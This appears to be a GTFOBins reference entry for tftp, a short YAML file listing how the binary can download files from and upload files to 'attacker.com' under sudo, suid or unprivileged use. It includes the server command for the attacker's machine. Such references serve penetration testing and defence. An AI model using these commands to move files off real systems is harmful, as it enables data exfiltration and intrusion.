<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/tftp -->
---
functions:
  download:
  - code: |-
      tftp attacker.com
      get /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender:
      code: |-
        atftpd --no-fork --verbose --daemon --no-fork --user root.root .
      comment: |-
        A TFTP server can be used on the attacker box to send the data.
  upload:
  - code: |-
      tftp attacker.com
      put /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver:
      code: |-
        atftpd --no-fork --verbose --daemon --no-fork --user root.root .
      comment: |-
        A TFTP server can be used on the attacker box to receive the data.
...
